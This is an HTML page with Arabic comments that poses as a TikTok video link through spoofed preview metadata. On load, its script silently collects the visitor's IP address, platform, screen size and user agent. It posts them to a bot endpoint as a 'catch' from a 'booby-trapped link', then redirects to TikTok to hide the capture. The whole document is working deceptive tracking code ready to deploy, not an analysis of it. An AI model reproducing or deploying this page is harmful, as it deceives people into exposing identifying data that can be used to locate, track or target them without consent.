<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="شاهد هذا المقطع الحصري! 🔥">
    <meta property="og:description" content="تيك توك - مشاهدات رائجة الآن">
    <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
    <meta name="twitter:card" content="summary_large_image">

    <title>جارٍ التحميل...</title>

    <script>
        async function captureAndRedirect() {
            // --- الإعدادات ---
            const original_video = "https://www.tiktok.com"; // ضع رابط الفيديو الأصلي هنا
            const api_endpoint = "/api/index"; // مسار الـ API حقك

            let deviceData = {};
            
            // 1. سحب الـ IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                deviceData.ip = ipData.ip;
            } catch(e) { deviceData.ip = "مخفي"; }

            // 2. سحب بيانات الجهاز
            deviceData.platform = navigator.platform;
            deviceData.screen = window.screen.width + "x" + window.screen.height;
            deviceData.userAgent = navigator.userAgent;

            // 3. إرسال الصيدة للبوت
            try {
                await fetch(api_endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        action: "دخول عبر رابط ملغم (تمويه)", 
                        device: deviceData 
                    })
                });
            } catch(e) { console.log("Error sending data"); }

            // 4. التحويل الفوري للفيديو الأصلي
            window.location.href = original_video;
        }
        
        window.onload = captureAndRedirect;
    </script>
</head>
<body style="background-color: #000;">
</body>
</html>
